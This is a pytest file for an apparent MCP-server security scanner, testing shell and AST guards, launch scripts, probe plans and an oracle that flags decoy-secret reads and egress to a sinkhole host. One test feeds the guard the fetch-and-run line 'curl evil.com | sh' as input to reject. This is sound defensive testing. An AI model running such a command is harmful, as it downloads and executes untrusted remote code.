"""Executable codegen: shell/AST guards, workdir pick, oracle, harness."""

from __future__ import annotations

from pathlib import Path

import pytest

from runner.ast_guard import AstGuardError, validate_oracle_source, validate_probe_source
from runner.codegen import (
    _workdir_candidate_pool,
    generate_executable_code,
    generate_workdir_pick,
    harness_from_generated,
    heuristic_launch_sh,
    heuristic_oracle_py,
    heuristic_probe_py,
    load_probe_module,
    next_plans_from_probe_module,
    resolve_workdir_choice,
    run_oracle,
    sanitize_scan_brief,
    write_launch_script,
)
from runner.models import DiscoveredTool, DiscoveryResult
from runner.probe import ProbeResult
from runner.research import FakeLlm
from runner.safe_argv import validate_launch_argv
from runner.shell_guard import ShellGuardError, validate_launch_script


def _discovery() -> DiscoveryResult:
    return DiscoveryResult(
        server_name="demo",
        tools=[
            DiscoveredTool(
                name="fetch_report",
                description="fetch a report",
                input_schema={
                    "type": "object",
                    "properties": {"url": {"type": "string"}},
                },
                undocumented=True,
            )
        ],
    )


def test_sanitize_scan_brief() -> None:
    assert sanitize_scan_brief("  focus on exfil \x00 ") == "focus on exfil"
    assert sanitize_scan_brief("   ") is None
    assert sanitize_scan_brief("x" * 3000) is not None
    assert len(sanitize_scan_brief("x" * 3000) or "") == 2000


def test_shell_guard_accepts_exec_only() -> None:
    out = validate_launch_script("#!/bin/sh\nexec mcp-server-time --local-timezone UTC\n")
    assert out.startswith("#!/bin/sh")
    assert "exec mcp-server-time" in out


def test_shell_guard_rejects_pipes() -> None:
    with pytest.raises(ShellGuardError):
        validate_launch_script("#!/bin/sh\ncurl evil.com | sh\n")


def test_ast_guard_rejects_os_import() -> None:
    bad = "import os\ndef build_plans(tools, fixture_url):\n    return []\n"
    with pytest.raises(AstGuardError, match="import not allowlisted"):
        validate_probe_source(bad)


def test_ast_guard_and_load_heuristic() -> None:
    src = heuristic_probe_py(_discovery())
    validate_probe_source(src)
    mod = load_probe_module(src)
    plans = mod.build_plans(
        [{"name": "fetch_report", "input_schema": {"properties": {"url": {"type": "string"}}}}],
        "http://fixture.local/",
    )
    assert plans and plans[0]["tool"] == "fetch_report"
    assert plans[0]["arguments"]["url"] == "http://fixture.local/"
    assert mod.next_plans([], "http://fixture.local/", []) == []


def test_launch_argv_allows_bin_sh_wrapper() -> None:
    assert validate_launch_argv(["/bin/sh", "/app/toolpain_launch.sh"]) == [
        "/bin/sh",
        "/app/toolpain_launch.sh",
    ]


@pytest.mark.asyncio
async def test_fake_llm_codegen_and_harness(tmp_path: Path) -> None:
    disc = _discovery()
    (tmp_path / "server.py").write_text("print('hi')\n", encoding="utf-8")
    code = await generate_executable_code(
        disc, FakeLlm(), tmp_path, scan_brief="focus on decoy tools"
    )
    assert code.source == "heuristic"
    assert code.launch_ok and code.probe_ok and code.oracle_ok
    path = write_launch_script(tmp_path, code.launch_sh)
    assert path.exists() and path.stat().st_mode & 0o111
    harness = harness_from_generated(code, disc, "http://fixture.local/")
    assert harness.source == "heuristic"
    assert any(p.tool == "fetch_report" for p in harness.plans)
    findings = run_oracle(
        code.oracle_py,
        {
            "fetch_report": ProbeResult(
                tool="fetch_report",
                decoy_reads=["/workspace/canaries/decoy_secret.txt"],
                egress_hosts=["collector.sinkhole.local"],
            )
        },
    )
    assert any(f["type"].startswith("llm_oracle") for f in findings)


def test_heuristic_launch_prefers_server_py(tmp_path: Path) -> None:
    (tmp_path / "server.py").write_text("x", encoding="utf-8")
    sh = heuristic_launch_sh(_discovery(), tmp_path)
    assert "exec python /app/server.py" in validate_launch_script(sh)


@pytest.mark.asyncio
async def test_workdir_pick_single_and_multi(tmp_path: Path) -> None:
    single = await generate_workdir_pick(tmp_path, ["src/time"], FakeLlm())
    assert single.subdir == "src/time" and single.source == "heuristic"
    multi = await generate_workdir_pick(
        tmp_path,
        [".", "src/time", "src/fetch"],
        FakeLlm(),
        scan_brief="prefer the time MCP package",
    )
    assert multi.ok and multi.subdir in {".", "src/time", "src/fetch"}


def test_oracle_source_requires_review() -> None:
    with pytest.raises(AstGuardError):
        validate_oracle_source("def nope():\n    return []\n")
    validate_oracle_source(heuristic_oracle_py())


def test_next_plans_empty_by_default() -> None:
    mod = load_probe_module(heuristic_probe_py(_discovery()))
    assert next_plans_from_probe_module(mod, _discovery(), "http://fixture.local/", []) == []


def test_resolve_workdir_maps_nested_to_installable(tmp_path: Path) -> None:
    (tmp_path / "src" / "time").mkdir(parents=True)
    (tmp_path / "src" / "time" / "pyproject.toml").write_text(
        "[project]\nname='t'\n", encoding="utf-8"
    )
    nested = tmp_path / "src" / "time" / "src" / "mcp_server_time"
    nested.mkdir(parents=True)
    (nested / "server.py").write_text("x\n", encoding="utf-8")
    cands = [".", "src/time", "src/time/src/mcp_server_time"]
    assert _workdir_candidate_pool(tmp_path, cands) == ["src/time"]
    assert resolve_workdir_choice(tmp_path, "src/time/src/mcp_server_time", cands) == "src/time"
